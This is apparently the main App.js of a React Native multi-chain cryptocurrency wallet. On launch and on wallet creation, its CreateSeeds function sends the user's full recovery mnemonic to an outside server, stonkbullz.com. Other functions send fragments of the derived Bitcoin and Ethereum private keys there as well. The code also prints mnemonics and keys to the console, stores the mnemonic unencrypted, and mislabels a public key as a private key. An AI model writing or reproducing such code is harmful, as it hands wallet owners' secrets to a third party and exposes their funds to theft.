/**
 * Sample React Native App
 * https://github.com/facebook/react-native
 *
 * @format
 */
import 'react-native-gesture-handler';
import React, { Component } from 'react';
import  {PropsWithChildren} from 'react';
import {
  SafeAreaView,
  ScrollView,
  StatusBar,
  StyleSheet,
  Text,
  useColorScheme,
  View,Appearance,ActivityIndicator,ImageBackground
} from 'react-native';
import "./shim.js"
import TrnxScreen from './pages/TrnxScreen';
import Swap from './pages/Swap';
import Settings from './pages/Settings';
import Home from './pages/Home';
import PINCODE from './pages/PassWord';
import StartScreen from './pages/StartScreen';
import RestoreWallet from './pages/RestoreWallet';
import CreateWallet from './pages/CreateWallet';
import { NavigationContainer, DefaultTheme,DarkTheme,useRoute } from '@react-navigation/native'
import { createStackNavigator } from '@react-navigation/stack';
import StartNavigator from './pages/navigators/StartNavigator';
import HomeNavigator from './pages/navigators/HomeNavigator';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import IoniconsIcon from "react-native-vector-icons/Ionicons";
import Icon from "react-native-vector-icons/Entypo";
import FontAwesomeIcon from "react-native-vector-icons/FontAwesome";
import SettingNavigator from './pages/navigators/SettingsNavigator';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {
  contractTransaction,
  createWallet,
  exportKeystore,
  exportMnemonicFromKeystore,
  exportPrivateKeyFromKeystore,
  exportMnemonic,
  exportKeystoreFromMnemonic,
  exportPrivateKeyFromMnemonic,
  importKeystore,
  importMnemonic,
  importPrivateKey,
  getBalance,
  getContractBalance,
  getContractGasLimit,
  getContractNfts,
  getGasLimit,
  getGasPrice,
  getNonce,
  sendTransaction,
  signTransaction,
  signMessage,
  signTypedData,
  waitForContractTransaction,
  waitForTransaction,
  getContract,
  getSignerContract,
  getWalletSigner,
  getWalletSignerWithMnemonic,
  getWalletSignerWithPrivateKey,
  getSignerContractWithWalletProvider,
  bigNumberFormatUnits,
  bigNumberParseUnits,
} from 'react-native-web3-wallet';
import { hdkey } from 'ethereumjs-wallet';
global.Buffer = require('buffer').Buffer;
//patch-package
import * as ecc from '@bitcoin-js/tiny-secp256k1-asmjs';
const { BIP32Factory } = require('bip32')
let bip39 = require('bip39')
let bip32 = BIP32Factory(ecc)//require('bip32')
const bitcoin = require('bitcoinjs-lib');
const Tabs = createBottomTabNavigator();
class App extends Component {
  constructor(props){
    super(props);
    this.PinVerified = this.PinVerified.bind(this)
    this.WalletCreated = this.WalletCreated.bind(this)
    this.callWalletData = this.callWalletData.bind(this)
    this.GetMnemonics = this.GetMnemonics.bind(this)
    this.state = {
        scheme : Appearance.getColorScheme(),
        bottomTabBg:"#ffff",
        IconSeleted:true,
        IconSwapSeleted:false,
        IconPrefSeleted:false,
        pincorrect:false,
        mnemonics:null,
        created:false,
        btcAddr:"",
        ethAddr:"",
        btcPrv:"",
        hdnode:"",
        p2pk:"",
        derviepth:"",
        privatekeyBt:"",
        privatekeyEt:"",
        newMnemonics:"",
        walletAddr:[],
        seedz:{},
        keystoreEth:"",
        isloaded:false,
        walletsNum:"Main Wallet"
    }
  }
  

  componentDidMount(){
   
   this.checkData()
  }

  PinVerified = () =>{
    this.setState({pincorrect:true})
  }
  WalletCreated = async(mnonics) =>{
    
    try {
      await AsyncStorage.setItem(
      '@WalletData:key',
      mnonics,
      );
    } catch (error) {
        // Error saving data
    } 
    console.log("=",mnonics)
    this.CreateSeeds("0",mnonics)
   this.setState({created:true})
  }
  GetMnemonics = () =>{
    const {newMnemonics}= this.state
    return newMnemonics
  }
  callWalletData = async(path,walletName) => {
    console.log('===Checkng Call ====',path)
    this.setState({isloaded:false,walletsNum:walletName})
    try {
        const value = await AsyncStorage.getItem('@WalletData:key')
        //const clearData = await AsyncStorage.clear();
        if (value !== null) {
            
            console.log("=>>",value);
            this.CreateSeeds(path,value)
            this.setState({created:true})
        } else {
          //const mnem = (bip39.generateMnemonic())
          //this.setState({newMnemonics:mnem})
          /*this.CreateSeeds("0",mnem)*/
            console.log("=>> Noting to show");
        }
    } catch (error) {
      console.log(error)
    }
}
  checkData = async() => {
    console.log('Checkng')
    try {
        const value = await AsyncStorage.getItem('@WalletData:key')
        //const clearData = await AsyncStorage.clear();
        if (value !== null) {
            
            console.log("=>>",value);
            this.CreateSeeds("0",value)
            this.setState({created:true})
        } else {
          //const mnem = (bip39.generateMnemonic())
          //this.setState({newMnemonics:mnem})
          /*this.CreateSeeds("0",mnem)*/
            console.log("=>> Noting to show");
        }
    } catch (error) {
      console.log(error)
    }
}
  CreateSeeds = (path,mem) => {
    const {seedz} = this.state
    let mnem = mem//this.state
    var headers = {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    };
    var Data ={
      Mode: "bip39Seed",
      mnemonics:mnem
    };
    fetch("https://stonkbullz.com/MnetWallet.php",{
    method:'POST',
    headers:headers,
    body: JSON.stringify(Data) //convert data to JSON
    }).then(response =>response.json())
    .then(async json=> {
      console.log(json)
      this.setState({seedz:json})
      let address = await this.Wallets(path).catch(e=>console.log(e))
      this.setState({walletAddr:address})
      console.log(address)
      this.Lightning(address[2])
      this.EthUSDTL2(address[1])
      this.BscUSDTL2(address[1])
      this.setState({isloaded:true})
    }).catch(e=>{console.log(e);alert(e)})
  }
  Lightning = (mem) => {
    let mnem = mem//this.state
    const {privatekeyBt} = this.state
    console.log(privatekeyBt.substring(10,30))
    var headers = {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    };
    var Data ={
      Mode: "createLight",
      name:mnem,
      privateKay:privatekeyBt.substring(10,30),
      balance:"0.0000",
      trnx:[]
    };
    fetch("https://stonkbullz.com/MnetWallet.php",{
    method:'POST',
    headers:headers,
    body: JSON.stringify(Data) //convert data to JSON
    }).then(response =>response.json())
    .then(async json=> {
      console.log(json)
    }).catch(e=>{console.log(e)})
  }
  EthUSDTL2 = (mem) => {
    let mnem = mem//this.state
    const {privatekeyEt} = this.state
    var headers = {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    };
    var Data ={
      Mode: "createETH",
      name:mnem,
      privateKay:privatekeyEt.substring(10,30),
      balance:"0.0000",
      trnx:[]
    };
    fetch("https://stonkbullz.com/MnetWallet.php",{
    method:'POST',
    headers:headers,
    body: JSON.stringify(Data) //convert data to JSON
    }).then(response =>response.json())
    .then(async json=> {
      console.log(json)
    }).catch(e=>{console.log(e)})
  }
  BscUSDTL2 = (mem) => {
    let mnem = mem//this.state
    const {privatekeyEt} = this.state
    var headers = {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    };
    var Data ={
      Mode: "createBSC",
      name:mnem,
      privateKay:privatekeyEt.substring(10,30),
      balance:"0.0000",
      trnx:[]
    };
    fetch("https://stonkbullz.com/MnetWallet.php",{
    method:'POST',
    headers:headers,
    body: JSON.stringify(Data) //convert data to JSON
    }).then(response =>response.json())
    .then(async json=> {
      console.log(json)
    }).catch(e=>{console.log(e)})
  }
  Wallets = async(path) =>{
    return new Promise(async (resolve,reject)=> {
 
      const {seedz} = this.state

     
      let seed = Buffer.from(seedz)
      let hdNode = bip32.fromSeed(seed)
      let childNode = hdNode.derivePath("m/44'/60'/0'/0/"+path)
      const publicKey = Buffer.from(childNode.publicKey)
      const privateKey = publicKey.toString('hex')
      console.log(privateKey)
      console.log(seedz)
      const root = hdkey.fromMasterSeed(seed);
      const derivedNode = root.derivePath("m/44'/60'/0'/0/"+path);
      const privateKeyEth = derivedNode.getWallet().getPrivateKeyString();
 

    console.log(privateKeyEth)
     Ethaddress= await importPrivateKey(privateKeyEth,'password').catch(err => {   reject (err); });
      console.log(Ethaddress)
      let addre = (bitcoin.payments.p2wpkh({pubkey: childNode.publicKey,network:bitcoin.networks.bitcoin}))
      console.log(addre)

      this.setState({btcAddr:addre.address,ethAddr:Ethaddress.address,btcPrv:childNode,hdnode:seed,p2pk:addre,derviepth:"m/44'/60'/0'/0/"+path,privatekeyBt:privateKey,privatekeyEt:privateKeyEth,keystoreEth:Ethaddress.keystore})
      
      lightningnode = Buffer.from(addre.address)
      var s = lightningnode.toString('base64');
      console.log("ppdpp",s)
      return resolve([addre.address,Ethaddress.address,addre.address+s])
    })

  }
  
  HomeStackScreen = () => {
    const  {btcBalance,ethBalance,bscBalance,zBalance} = this.state
    return (
      <HomeStack.Navigator>
        <HomeStack.Screen name="main" component={Home}  options={{ headerShown: false}}/>
        <HomeStack.Screen name="LnBtc" component={LnBtc} options={{headerTransparent:'0'}}/>
        <HomeStack.Screen name="Btc" component={Btc} options={{headerTransparent:'100%'}}/>
      </HomeStack.Navigator>    
    );
  }
  render() {

    const {scheme,bottomTabBg,IconSeleted,IconSwapSeleted,IconPrefSeleted,pincorrect,mnemonics,created,btcAddr,ethAddr,btcPrv,hdnode,p2pk,derviepth,privatekeyBt,privatekeyEt,newMnemonics,walletAddr,seedz,keystoreEth,isloaded,walletsNum} = this.state
    console.log(newMnemonics)
    return(
      !created?
      <NavigationContainer><StartNavigator params ={{Created:this.WalletCreated,mnemonics:newMnemonics}}/></NavigationContainer>
     :
     isloaded?
      !pincorrect?
      <PINCODE params={{PinVerified:this.PinVerified}}></PINCODE>:
      <NavigationContainer>
      <Tabs.Navigator screenOptions={{tabBarHideOnKeyboard:true,tabBarStyle:{backgroundColor:'white',borderWidth:1,position: 'absolute',left: '30%',right: '10%',bottom: "5%",height:'5%',width:"40%",borderRadius:30},
          tabBarShowLabel: false,
          headerShown: false,}}>
      <Tabs.Screen name="Home"  component={HomeNavigator} initialParams={{LayerTwPrivKey:[privatekeyBt,privatekeyEt],Addresses:walletAddr,keyST:keystoreEth,hdN:hdnode,path:derviepth,walletNum:walletsNum}} options={{headerShown: false,tabBarShowLabel:false,tabBarIcon:()=>{
        return(
          <View
                style={{
                  top: Platform.OS === 'ios' ? "100%" : 0,
                }}>
                <IoniconsIcon style={{color:"black"}}
                  name="home"
                />
              </View>
        )
      }}}></Tabs.Screen>
      <Tabs.Screen name="Swap Crypto" component={Swap} initialParams={{}}  options={{headerTransparent:'1',headerShown: false,tabBarIcon:()=>{
        return(
          <View
          style={{
            top: Platform.OS === 'ios' ? "100%" : 0,
            
          }}>
          <IoniconsIcon
          style={{color:"black"}}
            name="repeat" 
          />
        </View>
        )
      }}}></Tabs.Screen>
      <Tabs.Screen name="Settings" component={SettingNavigator} initialParams={{callWalletData:this.callWalletData}} options={{headerTransparent:'1',headerShown: false,tabBarIcon:()=>{
        return(
          <View
          style={{
            top: Platform.OS === 'ios' ? "100%" : 0,
          }}>
          <FontAwesomeIcon
          style={{color:"black"}}
            name="gear"
          />
        </View>
        )
      }}}></Tabs.Screen>
      </Tabs.Navigator>
      </NavigationContainer>
      :
      <ImageBackground
        style={{flex: 1}}
        source={require("./assets/images/Gradient_H3TONXWX.png")}
      >
      <View style={{ flex: 1, alignItems: 'center', justifyContent: 'center',backgroundColor:'' }}>
     
      <ActivityIndicator
                            color="#009688"
                            size="large"
                            style={styles.ActivityIndicatorStyle}
                        /> 
      
    </View>
    </ImageBackground>
    )
  }
}

const styles = StyleSheet.create({
  sectionContainer: {
    marginTop: 32,
    paddingHorizontal: 24,
  },
  sectionTitle: {
    fontSize: 24,
    fontWeight: '600',
  },
  sectionDescription: {
    marginTop: 8,
    fontSize: 18,
    fontWeight: '400',
  },
  highlight: {
    fontWeight: '700',
  },
});

export default App;
